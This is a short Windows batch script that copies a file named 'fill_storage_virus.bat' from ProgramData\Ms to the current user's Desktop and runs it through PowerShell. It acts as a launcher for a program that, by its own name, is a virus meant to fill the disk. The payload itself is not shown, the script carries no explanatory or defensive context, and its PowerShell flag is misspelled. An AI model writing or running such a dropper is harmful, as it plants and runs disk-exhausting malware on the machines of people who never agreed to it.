@echo off
cd\
cd ProgramData\Ms
copy fill_storage_virus.bat ..\..\..\..\..\..\Users\%USERNAME%\Desktop 
 cd\
cd Users\%USERNAME%\Desktop
powershell.exe -noexi "fill_storage_virus.bat"
exit

